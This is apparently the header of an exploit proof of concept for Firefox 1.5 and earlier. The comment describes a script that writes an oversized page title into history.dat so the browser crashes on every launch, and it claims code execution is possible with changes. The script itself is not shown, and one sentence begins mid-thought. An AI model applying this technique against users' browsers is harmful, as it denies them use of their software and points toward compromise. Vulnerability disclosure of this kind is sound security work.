Mozilla Firefox <= 1.5 (history.dat) Looping Vulnerability PoC
==============================================================




<!-- Firefox 1.5 buffer overflow

Basically firefox logs all kinda of URL data in it&#039;s history.dat file,
this little script will set a really large topic and Firefox will then
save that topic into it&#039;s history.dat.. The next time that firefox is
opened, it will instantly crash due to a buffer overflow -- this will
happen everytime until you manually delete the history.dat file -- which
most users won&#039;t figure out.

their browser after being exploited. DoS if you will. however, code
execution is possible with some modifcations.

Tested with Firefox 1.5 on Windows XP SP2.
